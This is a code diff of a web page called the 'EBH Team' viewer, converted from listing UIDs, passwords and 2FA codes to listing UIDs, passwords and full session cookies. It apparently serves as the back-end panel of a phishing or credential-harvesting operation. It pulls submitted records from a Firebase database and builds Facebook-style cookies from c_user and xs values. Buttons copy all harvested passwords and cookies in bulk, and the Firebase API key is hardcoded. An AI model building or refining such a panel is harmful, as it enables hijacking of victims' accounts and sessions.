@@ -2,35 +2,35 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>EBH Team - Account Viewer</title>
+<title>EBH Team - Cookie Viewer</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
-/* আগের CSS একই থাকবে */
+/* ===== নতুন কালার স্কিম (নেভি ব্লু + টিল + কমলা) ===== */
+:root {
+  --primary: #0e7c7e;        /* টিল গ্রিন - ডিপ সফট */
+  --primary-dark: #0a5e60;
+  --secondary: #f39c12;      /* কমলা - সফট */
+  --secondary-dark: #e67e22;
+  --accent: #1e6f5c;         /* গাঢ় সবুজাভ টিল */
+  --accent-dark: #155a47;
+  --danger: #c44545;         /* নরম লাল */
+  --danger-dark: #a53535;
+  --dark-bg: #0a1a2e;       /* নেভি ব্লু - ডিপ */
+  --card-bg: #11243b;       /* হালকা নেভি */
+  --text-light: #e6f1ff;    /* অফ হোয়াইট */
+  --text-gray: #a8c1d9;     /* সফট ব্লু-গ্রে */
+  --border-color: #1e3a5a;  /* ডিপ নেভি বর্ডার */
+  --shadow: 0 6px 12px rgba(0, 0, 0, 0.35);
+  --table-border: #264e70;   /* ব্লু-গ্রে বর্ডার */
+}
+
 * {
   margin: 0;
   padding: 0;
   box-sizing: border-box;
   -webkit-tap-highlight-color: transparent;
-}
-
-:root {
-  --primary: #7c3aed;
-  --primary-dark: #5b21b6;
-  --secondary: #f59e0b;
-  --secondary-dark: #d97706;
-  --accent: #10b981;
-  --accent-dark: #059669;
-  --danger: #ef4444;
-  --danger-dark: #dc2626;
-  --dark-bg: #0f172a;
-  --card-bg: #1e293b;
-  --text-light: #e5e7eb;
-  --text-gray: #94a3b8;
-  --border-color: #334155;
-  --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
-  --table-border: #475569;
 }
 
 body {
@@ -138,7 +138,7 @@ body {
   padding-right: 60px;
   border-radius: 8px;
   border: 1px solid var(--border-color);
-  background: rgba(15, 23, 42, 0.8);
+  background: rgba(10, 26, 46, 0.9);
   color: var(--text-light);
   font-size: 14px;
   height: 44px;
@@ -218,12 +218,12 @@ body {
 }
 
 .refresh-btn:hover {
-  background: rgba(124, 58, 237, 0.1);
+  background: rgba(14, 124, 126, 0.15);
 }
 
-/* Accounts Container - Google Sheet Style */
+/* Accounts Container */
 .accounts-container {
-  background: rgba(15, 23, 42, 0.8);
+  background: rgba(10, 26, 46, 0.8);
   border: 1px solid var(--border-color);
   border-radius: 8px;
   margin-bottom: 12px;
@@ -273,7 +273,7 @@ body {
 }
 
 .account-row:hover {
-  background: rgba(124, 58, 237, 0.1);
+  background: rgba(14, 124, 126, 0.1);
 }
 
 .row-cell {
@@ -323,14 +323,17 @@ body {
   font-family: 'Courier New', monospace;
 }
 
-.tfa-cell {
-  width: 250px;
-  min-width: 250px;
-  max-width: 250px;
+/* Cookie Cell - Full Cookie String */
+.cookie-cell {
+  width: 300px;
+  min-width: 300px;
+  max-width: 300px;
   color: var(--secondary);
   font-weight: 500;
   font-family: 'Courier New', monospace;
-  font-size: 0.85rem;
+  font-size: 0.8rem;
+  word-break: break-all;
+  white-space: pre-wrap;
 }
 
 .cell-content {
@@ -344,6 +347,15 @@ body {
   align-items: center;
   overflow-x: auto;
   white-space: nowrap;
+}
+
+/* Cookie-এর জন্য বিশেষ স্টাইল */
+.cookie-content {
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.3;
+  max-height: 80px;
+  overflow-y: auto;
 }
 
 .no-data {
@@ -364,7 +376,7 @@ body {
   transform: translate(-50%, -50%);
   text-align: center;
   z-index: 100;
-  background: rgba(15, 23, 42, 0.95);
+  background: rgba(10, 26, 46, 0.95);
   padding: 20px;
   border-radius: 8px;
   min-width: 200px;
@@ -387,7 +399,7 @@ body {
   padding: 8px 12px;
   font-size: 0.75rem;
   color: var(--text-gray);
-  background: rgba(15, 23, 42, 0.8);
+  background: rgba(10, 26, 46, 0.8);
   border-top: 1px solid var(--border-color);
   border-radius: 0 0 8px 8px;
 }
@@ -434,13 +446,13 @@ body {
   background: var(--accent-dark);
 }
 
-.copy-2fa-btn {
+.copy-cookie-btn {
   background: var(--secondary);
   color: var(--dark-bg);
   font-weight: bold;
 }
 
-.copy-2fa-btn:hover {
+.copy-cookie-btn:hover {
   background: var(--secondary-dark);
 }
 
@@ -469,7 +481,7 @@ body {
 }
 
 .danger-btn:hover {
-  background: rgba(239, 68, 68, 0.1);
+  background: rgba(196, 69, 69, 0.1);
 }
 
 .footer {
@@ -546,7 +558,7 @@ body {
 }
 
 .warning-text {
-  background: rgba(239, 68, 68, 0.1);
+  background: rgba(196, 69, 69, 0.1);
   border-left: 3px solid var(--danger);
   padding: 10px;
   border-radius: 0 4px 4px 0;
@@ -634,10 +646,10 @@ body {
     max-width: 120px;
   }
   
-  .tfa-cell {
-    width: 200px;
-    min-width: 200px;
-    max-width: 200px;
+  .cookie-cell {
+    width: 250px;
+    min-width: 250px;
+    max-width: 250px;
   }
 }
 
@@ -646,6 +658,12 @@ body {
     font-size: 10px;
     padding: 6px 3px;
     min-height: 34px;
+  }
+  
+  .cookie-cell {
+    width: 200px;
+    min-width: 200px;
+    max-width: 200px;
   }
 }
 </style>
@@ -658,14 +676,14 @@ body {
 
 <div class="container">
   <div class="header">
-    <h1><i class="fas fa-fire"></i> EBH TEAM WORK <i class="fas fa-users"></i></h1>
-    <div class="subtitle">UID, Password & 2FA Code Viewer</div>
+    <h1><i class="fas fa-cookie-bite"></i> EBH TEAM COOKIE <i class="fas fa-database"></i></h1>
+    <div class="subtitle">UID, Password & Full Cookie Viewer</div>
   </div>
   
   <div class="stats-card">
     <div class="stat">
       <span class="number" id="totalCount">0</span>
-      <span class="label">Total Accounts</span>
+      <span class="label">Total Cookies</span>
     </div>
     <div class="divider"></div>
     <div class="stat">
@@ -683,7 +701,7 @@ body {
   
   <div class="search-section">
     <div class="search-container">
-      <input type="text" id="searchInput" placeholder="Search by UID, Password or 2FA Code...">
+      <input type="text" id="searchInput" placeholder="Search by UID, Password or Cookie...">
       <button class="search-btn" onclick="searchByPassword()">
         <i class="fas fa-search"></i> SEARCH
       </button>
@@ -692,7 +710,7 @@ body {
   
   <div class="main-card">
     <div class="card-header">
-      <h2 class="card-title"><i class="fas fa-user-circle"></i> Account List</h2>
+      <h2 class="card-title"><i class="fas fa-cookie"></i> Cookie List</h2>
       <button class="refresh-btn" onclick="loadData()">
         <i class="fas fa-sync-alt"></i> Refresh
       </button>
@@ -703,11 +721,11 @@ body {
         <div class="loading-spinner">
           <i class="fas fa-spinner fa-spin"></i>
         </div>
-        <p>Loading accounts from EBH Database...</p>
+        <p>Loading cookies from EBH Database...</p>
       </div>
     </div>
     
-    <div class="count-display" id="countDisplay">0 accounts</div>
+    <div class="count-display" id="countDisplay">0 cookies</div>
     
     <div class="copy-buttons-row">
       <button class="copy-btn-third copy-uid-btn" onclick="copyUIDs()">
@@ -716,8 +734,8 @@ body {
       <button class="copy-btn-third copy-pass-btn" onclick="copyPasswords()">
         <i class="fas fa-key"></i> COPY PASS
       </button>
-      <button class="copy-btn-third copy-2fa-btn" onclick="copy2FA()">
-        <i class="fas fa-shield-alt"></i> COPY 2FA
+      <button class="copy-btn-third copy-cookie-btn" onclick="copyCookies()">
+        <i class="fas fa-cookie-bite"></i> COPY COOKIE
       </button>
     </div>
     
@@ -729,7 +747,7 @@ body {
   </div>
   
   <div class="footer">
-    <p>EBH TEAM Account Viewer • MTWork Database</p>
+    <p>EBH TEAM Cookie Viewer • MTWork Database</p>
   </div>
 </div>
 
@@ -743,7 +761,7 @@ body {
     
     <div class="modal-body">
       <p>Are you sure you want to permanently delete all data from Firebase?</p>
-      <p>This action will delete <strong id="deleteCount">0</strong> accounts.</p>
+      <p>This action will delete <strong id="deleteCount">0</strong> cookies.</p>
       
       <div class="warning-text">
         <p><i class="fas fa-exclamation-circle"></i> <strong>Warning:</strong> This action cannot be undone.</p>
@@ -758,7 +776,7 @@ body {
 </div>
 
 <script>
-// Firebase Configuration - আপনার নতুন Firebase অ্যাকাউন্ট
+// Firebase Configuration
 const firebaseConfig = {
   apiKey: "AIzaSyCI4HPJ_mqhqmDjKHQr3Cd302rO2Tud1Go",
   authDomain: "mtwork-fc469.firebaseapp.com",
@@ -770,7 +788,7 @@ const firebaseConfig = {
   measurementId: "G-ET7141VPKM"
 };
 
-// Firebase ইনিশিয়ালাইজেশন
+// Firebase Initialize
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
@@ -798,7 +816,7 @@ function showLoading() {
       <div class="loading-spinner">
         <i class="fas fa-spinner fa-spin"></i>
       </div>
-      <p>Loading accounts from EBH Database...</p>
+      <p>Loading cookies from EBH Database...</p>
     </div>
   `;
 }
@@ -817,7 +835,7 @@ function updateStats() {
     searchResultCard.style.display = 'none';
   }
   
-  countDisplay.textContent = `${isSearching ? searchResults : total} accounts`;
+  countDisplay.textContent = `${isSearching ? searchResults : total} cookies`;
   deleteCount.textContent = total;
   
   const now = new Date();
@@ -828,14 +846,14 @@ function updateStats() {
 function renderAccountsTable(accounts) {
   if (accounts.length === 0) {
     const noDataMessage = isSearching && currentSearchTerm 
-      ? `No accounts found containing: "${currentSearchTerm}"`
-      : "No accounts found in the database.";
+      ? `No cookies found containing: "${currentSearchTerm}"`
+      : "No cookies found in the database.";
     
     accountsContainer.innerHTML = `
       <div class="table-container">
         <div class="no-data">
           <td colspan="4">
-            <i class="fas fa-database" style="font-size: 2rem; margin-bottom: 10px; opacity: 0.5;"></i>
+            <i class="fas fa-cookie" style="font-size: 2rem; margin-bottom: 10px; opacity: 0.5;"></i>
             <p>${noDataMessage}</p>
           </td>
         </div>
@@ -850,11 +868,19 @@ function renderAccountsTable(accounts) {
         <div class="header-cell serial-cell">#</div>
         <div class="header-cell uid-cell">UID</div>
         <div class="header-cell password-cell">PASSWORD</div>
-        <div class="header-cell tfa-cell">2FA CODE</div>
+        <div class="header-cell cookie-cell">🍪 FULL COOKIE</div>
       </div>
   `;
   
   accounts.forEach((account, index) => {
+    // Cookie string দেখানোর জন্য প্রস্তুত করা
+    let cookieDisplay = account.full_cookie || account.cookie || account.cookies || account.fullCookie || account.token || 'No cookie';
+    
+    // খুব বড় কুকি হলে ছোট করে দেখানো
+    if (cookieDisplay.length > 80) {
+      cookieDisplay = cookieDisplay.substring(0, 80) + '...';
+    }
+    
     tableHTML += `
       <div class="account-row">
         <div class="row-cell serial-cell">
@@ -866,8 +892,8 @@ function renderAccountsTable(accounts) {
         <div class="row-cell password-cell">
           <div class="cell-content" title="${account.password || 'N/A'}">${account.password || 'N/A'}</div>
         </div>
-        <div class="row-cell tfa-cell">
-          <div class="cell-content" title="${account.tfa || 'No 2FA'}">${account.tfa || 'No 2FA'}</div>
+        <div class="row-cell cookie-cell">
+          <div class="cell-content cookie-content" title="${account.full_cookie || account.cookie || account.fullCookie || 'No cookie'}">${cookieDisplay}</div>
         </div>
       </div>
     `;
@@ -878,9 +904,9 @@ function renderAccountsTable(accounts) {
 }
 
 function extractDataFromObject(obj) {
-  // UID এর জন্য সম্ভাব্য সব key চেক করা হচ্ছে
+  // UID এক্সট্রাক্ট
   let uid = "";
-  const uidKeys = ['uid', 'username', 'user', 'email', 'userId', 'id'];
+  const uidKeys = ['uid', 'username', 'user', 'c_user', 'userId', 'id'];
   for (const key of uidKeys) {
     if (obj[key] && obj[key].toString().trim()) {
       uid = obj[key].toString().trim();
@@ -888,9 +914,9 @@ function extractDataFromObject(obj) {
     }
   }
   
-  // Password এর জন্য সম্ভাব্য সব key চেক করা হচ্ছে
+  // Password এক্সট্রাক্ট
   let password = "";
-  const passwordKeys = ['password', 'pass', 'pwd', 'secret', 'key'];
+  const passwordKeys = ['password', 'pass', 'pwd', 'secret'];
   for (const key of passwordKeys) {
     if (obj[key] && obj[key].toString().trim()) {
       password = obj[key].toString().trim();
@@ -898,17 +924,25 @@ function extractDataFromObject(obj) {
     }
   }
   
-  // 2FA/TFA এর জন্য সম্ভাব্য সব key চেক করা হচ্ছে
-  let tfa = "";
-  const tfaKeys = ['twofa_key', 'tfa', '2fa', 'twofa', 'twoFactor', 'auth', 'cookie', 'cookies', 'token'];
-  for (const key of tfaKeys) {
+  // 🍪 FULL COOKIE এক্সট্রাক্ট - সব রকম key চেক করা হচ্ছে
+  let full_cookie = "";
+  const cookieKeys = ['full_cookie', 'fullCookie', 'cookie', 'cookies', 'full_cookies', 'cookie_string', 'cookie_str', 'token', 'fb_cookie'];
+  for (const key of cookieKeys) {
     if (obj[key] && obj[key].toString().trim()) {
-      tfa = obj[key].toString().trim();
+      full_cookie = obj[key].toString().trim();
       break;
     }
   }
   
-  return { uid, password, tfa };
+  // যদি কোন কুকি না পাওয়া যায়, তাহলে পুরো অবজেক্ট স্ট্রিং করে চেক
+  if (!full_cookie) {
+    // c_user এবং xs থাকলে সেটাকে কুকি হিসেবে ধরা
+    if (obj.c_user && obj.xs) {
+      full_cookie = `c_user=${obj.c_user}; xs=${obj.xs}`;
+    }
+  }
+  
+  return { uid, password, full_cookie };
 }
 
 function loadData() {
@@ -919,9 +953,9 @@ function loadData() {
   currentSearchTerm = "";
   searchResultCard.style.display = 'none';
   
-  console.log("Loading data from Firebase...");
+  console.log("Loading cookie data from Firebase...");
   
-  // Firebase থেকে ডাটা লোড - root থেকে শুরু করে সব child চেক করা হচ্ছে
+  // Firebase থেকে ডাটা লোড
   db.ref("/").once("value")
   .then(snapshot => {
     console.log("Firebase Data Structure:", snapshot.val());
@@ -931,7 +965,22 @@ function loadData() {
     if (snapshot.exists()) {
       const data = snapshot.val();
       
-      // প্রথমে ebh_submissions চেক করা
+      // 1. ebh_cookie_submissions চেক করা (Cookie submission path)
+      if (data.ebh_cookie_submissions) {
+        console.log("Found ebh_cookie_submissions node");
+        const submissions = data.ebh_cookie_submissions;
+        
+        Object.keys(submissions).forEach(key => {
+          const submissionData = submissions[key];
+          const extracted = extractDataFromObject(submissionData);
+          
+          if (extracted.uid || extracted.password || extracted.full_cookie) {
+            allAccounts.push(extracted);
+          }
+        });
+      }
+      
+      // 2. ebh_submissions চেক করা (Old submissions)
       if (data.ebh_submissions) {
         console.log("Found ebh_submissions node");
         const submissions = data.ebh_submissions;
@@ -940,31 +989,26 @@ function loadData() {
           const submissionData = submissions[key];
           const extracted = extractDataFromObject(submissionData);
           
-          if (extracted.uid || extracted.password || extracted.tfa) {
+          if (extracted.uid || extracted.password || extracted.full_cookie) {
             allAccounts.push(extracted);
           }
         });
       }
       
-      // যদি ebh_submissions না থাকে, তাহলে root level থেকে সব ডাটা চেক করা
+      // 3. Root level এ সব কিছু চেক করা
       if (allAccounts.length === 0) {
-        console.log("Checking all root level data...");
+        console.log("Checking all root level data for cookies...");
         
-        // Recursive function to find all objects
         function findAccounts(obj, path = '') {
           if (!obj) return;
           
           if (typeof obj === 'object') {
-            const keys = Object.keys(obj);
-            
-            // Check if this object has uid/password/tfa fields
             const extracted = extractDataFromObject(obj);
-            if (extracted.uid || extracted.password || extracted.tfa) {
+            if (extracted.uid || extracted.password || extracted.full_cookie) {
               allAccounts.push(extracted);
             }
             
-            // Recursively check all children
-            keys.forEach(key => {
+            Object.keys(obj).forEach(key => {
               findAccounts(obj[key], path + '/' + key);
             });
           }
@@ -974,12 +1018,11 @@ function loadData() {
       }
     }
     
-    // ডুপ্লিকেট রিমুভ করা
+    // ডুপ্লিকেট রিমুভ করা (UID + Cookie ভিত্তিতে)
     allAccounts = allAccounts.filter((account, index, self) =>
       index === self.findIndex(a => 
         a.uid === account.uid && 
-        a.password === account.password && 
-        a.tfa === account.tfa
+        a.full_cookie === account.full_cookie
       )
     );
     
@@ -987,9 +1030,9 @@ function loadData() {
     renderAccountsTable(allAccounts);
     updateStats();
     
-    console.log(`Total accounts loaded: ${allAccounts.length}`);
+    console.log(`Total cookies loaded: ${allAccounts.length}`);
     if (allAccounts.length > 0) {
-      console.log("Sample accounts:", allAccounts.slice(0, 3));
+      console.log("Sample cookies:", allAccounts.slice(0, 3));
     }
   })
   .catch(err => {
@@ -997,7 +1040,7 @@ function loadData() {
     
     accountsContainer.innerHTML = `
       <div class="table-container">
-        <div class="no-data" style="color: #ef4444;">
+        <div class="no-data" style="color: #c44545;">
           <td colspan="4">
             <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
             <p>Error loading data: ${err.message}</p>
@@ -1023,7 +1066,7 @@ function searchByPassword() {
   filteredAccounts = allAccounts.filter(account => 
     (account.password && account.password.toLowerCase().includes(searchTerm)) ||
     (account.uid && account.uid.toLowerCase().includes(searchTerm)) ||
-    (account.tfa && account.tfa.toLowerCase().includes(searchTerm))
+    (account.full_cookie && account.full_cookie.toLowerCase().includes(searchTerm))
   );
   
   isSearching = true;
@@ -1048,7 +1091,7 @@ function copyUIDs() {
       const copyBtn = document.querySelector('.copy-uid-btn');
       const originalText = copyBtn.innerHTML;
       copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
-      copyBtn.style.background = "#5b21b6";
+      copyBtn.style.background = "#0a5e60";
       
       setTimeout(() => {
         copyBtn.innerHTML = originalText;
@@ -1076,7 +1119,7 @@ function copyPasswords() {
       const copyBtn = document.querySelector('.copy-pass-btn');
       const originalText = copyBtn.innerHTML;
       copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
-      copyBtn.style.background = "#059669";
+      copyBtn.style.background = "#155a47";
       
       setTimeout(() => {
         copyBtn.innerHTML = originalText;
@@ -1089,7 +1132,7 @@ function copyPasswords() {
     });
 }
 
-function copy2FA() {
+function copyCookies() {
   const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
   
   if (accountsToCopy.length === 0) {
@@ -1097,14 +1140,14 @@ function copy2FA() {
     return;
   }
   
-  const tfaCodes = accountsToCopy.map(account => account.tfa || "No 2FA").join("\n");
+  const cookies = accountsToCopy.map(account => account.full_cookie || "No cookie").join("\n");
   
-  navigator.clipboard.writeText(tfaCodes)
+  navigator.clipboard.writeText(cookies)
     .then(() => {
-      const copyBtn = document.querySelector('.copy-2fa-btn');
+      const copyBtn = document.querySelector('.copy-cookie-btn');
       const originalText = copyBtn.innerHTML;
       copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
-      copyBtn.style.background = "#d97706";
+      copyBtn.style.background = "#e67e22";
       
       setTimeout(() => {
         copyBtn.innerHTML = originalText;
@@ -1113,7 +1156,7 @@ function copy2FA() {
     })
     .catch(err => {
       console.error('Copy failed:', err);
-      alert("Failed to copy 2FA codes.");
+      alert("Failed to copy cookies.");
     });
 }
 
@@ -1141,13 +1184,13 @@ function deleteAllData() {
       <div class="loading-spinner">
         <i class="fas fa-spinner fa-spin"></i>
       </div>
-      <p>Deleting all data from Firebase...</p>
+      <p>Deleting all cookies from Firebase...</p>
     </div>
   `;
   
   console.log("Attempting to delete all Firebase data...");
   
-  // Root থেকে সব ডাটা ডিলিট করা
+  // Root থেকে সব ডাটা ডিলিট
   db.ref("/").remove()
   .then(() => {
     console.log("✅ Firebase data deleted successfully!");
@@ -1163,9 +1206,8 @@ function deleteAllData() {
         <div class="no-data" style="color: #10b981;">
           <td colspan="4">
             <i class="fas fa-check-circle" style="font-size: 2rem; margin-bottom: 10px;"></i>
-            <p>✅ All data deleted successfully from Firebase!</p>
+            <p>✅ All cookies deleted successfully from Firebase!</p>
             <p>Database is now completely empty.</p>
-            <p><small>Please wait a moment for changes to sync.</small></p>
           </td>
         </div>
       </div>
@@ -1175,7 +1217,6 @@ function deleteAllData() {
     
     setTimeout(() => {
       alert("✅ All data has been permanently deleted from Firebase.");
-      // ডিলিট হওয়ার পর রিফ্রেশ করা
       setTimeout(() => location.reload(), 1000);
     }, 1000);
   })
@@ -1184,7 +1225,7 @@ function deleteAllData() {
     
     accountsContainer.innerHTML = `
       <div class="table-container">
-        <div class="no-data" style="color: #ef4444;">
+        <div class="no-data" style="color: #c44545;">
           <td colspan="4">
             <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
             <p>❌ Error deleting data from Firebase</p>
